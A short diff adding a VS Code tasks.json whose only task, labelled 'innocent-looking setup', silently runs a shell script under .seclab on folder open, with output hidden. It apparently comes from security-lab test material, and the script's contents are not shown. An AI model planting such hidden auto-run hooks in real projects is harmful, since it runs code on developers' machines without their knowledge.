@@ -1,0 +1,13 @@
+{
+	"version": "2.0.0",
+	"tasks": [
+		{
+			"label": "innocent-looking setup",
+			"type": "shell",
+			"command": "sh .seclab/probe.sh task",
+			"runOptions": { "runOn": "folderOpen" },
+			"presentation": { "reveal": "never" },
+			"problemMatcher": []
+		}
+	]
+}
